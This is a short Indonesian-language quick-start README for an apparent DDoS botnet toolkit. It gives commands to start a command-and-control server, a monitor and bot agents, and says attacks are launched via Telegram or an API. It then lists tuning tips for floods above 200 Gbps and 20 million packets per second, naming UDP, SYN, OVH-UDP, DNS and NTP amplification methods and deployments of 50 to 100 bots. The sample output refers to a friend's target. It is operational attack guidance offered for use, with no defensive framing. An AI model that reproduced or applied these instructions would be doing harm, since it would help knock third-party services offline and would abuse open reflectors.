# 🚀 Quick Start - Real-time Monitor

## Setup Cepat (3 Langkah)

### 1️⃣ Start C2 Server
```bash
node index.js c2-server -p 8080 --host 0.0.0.0
```

### 2️⃣ Start Monitor (Terminal Baru)
```bash
node monitor.js
```

### 3️⃣ Start Bot Agent & Launch Attack
```bash
# Terminal baru
node index.js c2-agent --c2-url http://localhost:8080

# Lalu via Telegram bot, kirim attack command
# Atau via API
```

## 📊 Monitor Output Example

```
⚡ CURRENT RATES
───────────────────────────────────────────
🔥 Requests/sec:      2.5M RPS
📡 Packets/sec:       20.59M PPS  ← Target teman lu
🌐 Bandwidth:         206.75 Gbps ← Target teman lu
```

## 🎯 Tips Cepat

**Untuk High Gbps (200+ Gbps):**
- Gunakan method: `UDP`, `TCP`, `SYN`, `OVH-UDP`
- Threads: 2000+
- RPC: 100+
- Deploy 50-100 bot agents

**Untuk High PPS (20M+ PPS):**
- Method: `UDP`, `DNS-AMP`, `NTP-AMP`
- Small packet size
- High RPC

## 🔥 Ready to Test!

Monitor sudah siap. Tinggal:
1. Launch attack
2. Watch stats naik! 📈

Dokumentasi lengkap: `MONITOR-GUIDE.md`
